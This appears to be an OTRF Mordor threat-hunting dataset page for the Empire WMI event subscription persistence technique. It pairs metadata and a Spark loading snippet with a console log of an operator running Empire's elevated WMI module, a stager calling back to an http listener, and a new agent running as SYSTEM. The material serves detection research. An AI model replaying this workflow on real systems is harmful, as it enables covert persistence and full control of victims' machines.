# Empire Elevated WMI Subscription

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190518184306 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/05/18 |
| platform              | Windows |
| Tactic(s)             | ['[TA0003](https://attack.mitre.org/tactics/TA0003)', '[TA0004](https://attack.mitre.org/tactics/TA0004)'] |
| Technique(s)          | ['[T1546.003](https://attack.mitre.org/techniques/T1546/003)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1'] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi_subscription.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries leveraging WMI subscriptions for persistence.

## Adversary View
```
(Empire: powershell/privesc/bypassuac_fodhelper) > agents
[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            
W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http            
13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http            


(Empire: agents) > interact 13ZK6G7M
(Empire: 13ZK6G7M) > 
(Empire: 13ZK6G7M) > usemodule persistence/elevated/wmi*
(Empire: powershell/persistence/elevated/wmi) > info

              Name: Invoke-WMI
            Module: powershell/persistence/elevated/wmi
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @jbooz1

Description:
  Persist a stager (or script) using a permanent WMI
  subscription. This has a difficult detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name        Required    Value                     Description
  ----        --------    -------                   -----------
  Agent       True        13ZK6G7M                  Agent to run module on.                 
  Listener    True        http                      Listener to use.                        
  DailyTime   False                                 Daily time to trigger the script        
                                                    (HH:mm).                                
  AtStartup   False       True                      Switch. Trigger script (within 5        
                                                    minutes) of system startup.             
  FailedLogon False                                 Trigger script with a failed logon      
                                                    attempt from a specified user           
  SubName     True        Updater                   Name to use for the event subscription. 
  ExtFile     False                                 Use an external file for the payload    
                                                    instead of a stager.                    
  Cleanup     False                                 Switch. Cleanup the trigger and any     
                                                    script from specified location.         
  UserAgent   False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Proxy       False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  ProxyCreds  False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      

(Empire: powershell/persistence/elevated/wmi) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked 13ZK6G7M to run TASK_CMD_WAIT
[*] Agent 13ZK6G7M tasked with task ID 1
[*] Tasked agent 13ZK6G7M to run module powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) > 
WMI persistence established using listener http with OnStartup WMI subsubscription trigger.

(Empire: powershell/persistence/elevated/wmi) > 
(Empire: powershell/persistence/elevated/wmi) > 
[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent PYA28EDF checked in
[+] Initial agent PYA28EDF from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to PYA28EDF at 172.18.39.5

(Empire: powershell/persistence/elevated/wmi) > 
(Empire: powershell/persistence/elevated/wmi) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            
W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5584   5/0.0    2020-09-04 20:43:48  http            
13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5676   5/0.0    2020-09-04 20:43:48  http            

PYA28EDF ps 172.18.39.5     WORKSTATION5      *THESHIRE\SYSTEM        powershell         7480   5/0.0    2020-09-04 20:49:29  http            

(Empire: agents) > interact PYA28EDF
(Empire: PYA28EDF) > shell whoami
[*] Tasked PYA28EDF to run TASK_SHELL
[*] Agent PYA28EDF tasked with task ID 1
(Empire: PYA28EDF) > 
nt authority\system
..Command execution completed.

(Empire: PYA28EDF) > 
(Empire: PYA28EDF) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi_subscription.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        